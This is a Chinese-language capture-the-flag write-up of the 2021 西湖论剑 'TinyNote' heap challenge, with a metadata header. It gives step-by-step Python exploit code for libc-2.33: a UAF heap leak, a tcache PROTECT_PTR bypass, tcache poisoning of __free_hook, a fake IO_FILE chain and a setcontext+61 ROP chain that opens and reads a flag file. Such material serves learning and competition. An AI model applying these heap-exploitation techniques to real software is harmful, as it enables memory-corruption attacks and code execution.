---
title: 2021 西湖论剑 - TinyNote 详细分析
contest: 2021 西湖论剑
year: 2021
difficulty: hard
vuln_type: [heap_exploit, pwn_unknown]
tags: [libc-2.33, tcache, UAF, PROTECT_PTR, heap-base-leak, ORW, setcontext, IO_FILE, exit_hook, free_hook]
attack_chain: ["add(0) add(1) delete(0) show(0) leak heap_base（残留 5 字节）", "xor = heap_base >> 12 利用 PROTECT_PTR 绕过 tcache key 校验", "edit(1, p64(xor^heap)) 写 fake tcache fd 链", "add(1) add(0) edit(0, p64(0)+p64(0x421)) 制造 unsorted bin 大小", "33 次 add(0) 填满 tcache", "delete(1) show(1) leak libcbase", "tcache poisoning 把 free_hook 改成 setcontext+61", "change 改 heap 0x30/0x40/0x50/0xc0/0xe0/0x1a0 构造 IO_FILE + vtable", "start 改 p64(pcop)+p64(heap+0x700) 触发 _IO_wfile_overflow → call [rdx+0x20]", "setcontext+61 控 rsp/rip → ORW (open/read/write flag)"]
key_payload: "mov rdx, [rdi+8]; mov [rsp], rax; call [rdx+0x20]  → setcontext+61 触发 gadget"
one_liner: libc-2.33 IO_FILE 利用 _IO_wfile_jumps + setcontext+61 + ORW
lesson: libc-2.33+ 没了 __free_hook 还能用，要走 IO_FILE 走 exit 时 _IO_wfile_overflow
quality: high
---

# 2021 西湖论剑 - TinyNote 详细分析

原文 https://www.ctfiot.com/153753.html （看雪论坛 a2ure）

## 题目
- libc-2.33，4 个 note 操作：add/edit/show/delete
- 没有 system / 没有 __free_hook（2.34 才完全移除，但利用门槛提高）
- 走 IO_FILE 走 _IO_wfile_jumps

## 前置知识
```asm
mov rdx, qword ptr [rdi + 8]
mov qword ptr [rsp], rax
call qword ptr [rdx + 0x20]
```
→ 经典 IO_FILE `_IO_wfile_overflow` 末尾的 vtable 跳转 call。

## 攻击链
### Step 1: leak heap
```python
add(0); add(1)
delete(0)
show(0)
heap_base = u64(io.recv(5).ljust(8, b'\x00')) << 12
```

### Step 2: 绕过 tcache PROTECT_PTR (libc-2.32+)
- 2.32+ tcache fd 指针会被 `(ptr >> 12) ^ ptr` 加密
- 拿到 heap_base 后能算 `xor = heap_base >> 12`
- 写 `p64(xor ^ target)` 绕过 key 校验

### Step 3: leak libc
```python
edit(0, p64(0) + p64(0x421))  # fake size 0x421
for i in range(33):
    add(0)                     # 填满 tcache
delete(1)
show(1)
libcbase = u64(io.recv(6).ljust(8, '\x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
```

### Step 4: 构造 IO_FILE fake chain
```python
change(heap_base + 0x30, p64(1) + p64(0xffffffffffff))
change(heap_base + 0x40, p64(0) + p64(start))      # _wide_data 指向 start
change(heap_base + 0x50, p64(end))                # _wide_data->_IO_write_ptr
change(heap_base + 0xc0, p64(0))                  # 清理
change(heap_base + 0xe0, p64(0) + p64(io_str_jumps))  # vtable
change(heap_base + 0x1a0, p64(free_hook))         # fake wide vtable
change(start, p64(pcop) + p64(heap_base + 0x700))  # _IO_wfile_overflow call [rdx+0x20]
change(heap_base + 0x720, p64(setcontext + 61))   # jump target
```

### Step 5: setcontext+61 + ORW
```python
change(heap_base + 0x7a0, p64(heap_base + 0x800) + p64(rdi_ret))  # rdi=&'flag'
change(heap_base + 0x7c0, 'flag'.ljust(0x10, '\x00'))              # filename
change(heap_base + 0x800, p64(heap_base + 0x7c0) + p64(rsi_ret))  # rsi=0
change(heap_base + 0x810, p64(0) + p64(open))                      # open
change(heap_base + 0x820, p64(rdi_ret) + p64(3))                   # rdi=3
change(heap_base + 0x830, p64(rsi_ret) + p64(heap_base + 0x900))  # rsi=buf
change(heap_base + 0x840, p64(rdx_ret) + p64(0x50))                # rdx=size
change(heap_base + 0x850, p64(read) + p64(rdi_ret))                # read
change(heap_base + 0x860, p64(1) + p64(write))                     # write to stdout
```

## 关键 gadget
```python
pcop = libcbase + 0x14a0a0      # _IO_wfile_overflow 内部
setcontext = libcbase + libc.sym['setcontext']
rdi_ret = libcbase + 0x28a55
rsi_ret = libcbase + 0x2a4cf
rdx_ret = libcbase + 0xc7f32
```

## 教学价值
- **libc-2.33** 是分水岭：free_hook/malloc_hook 还在但 tcache 加了 PROTECT_PTR
- 必须 `xor = heap_base >> 12` 才能正确写 tcache fd
- **IO_FILE + _IO_wfile_overflow + setcontext+61** 是 2.33 主流 pwn 利用路线
- `setcontext+61`：x86_64 系统调用接口设寄存器
- `mov rdx, [rdi+8]; call [rdx+0x20]` 是触发任意函数调用的"魔法 gadget"

## 触发链
1. free(chunk) 触发 __free_hook → 系统找不到（free_hook 已设置但实际是 setcontext）
2. exit() 走 _IO_cleanup → _IO_flush_all → _IO_wfile_overflow → 我们的 setcontext+61
3. setcontext+61 设 rsp/rip → ORW
4. 拿到 flag
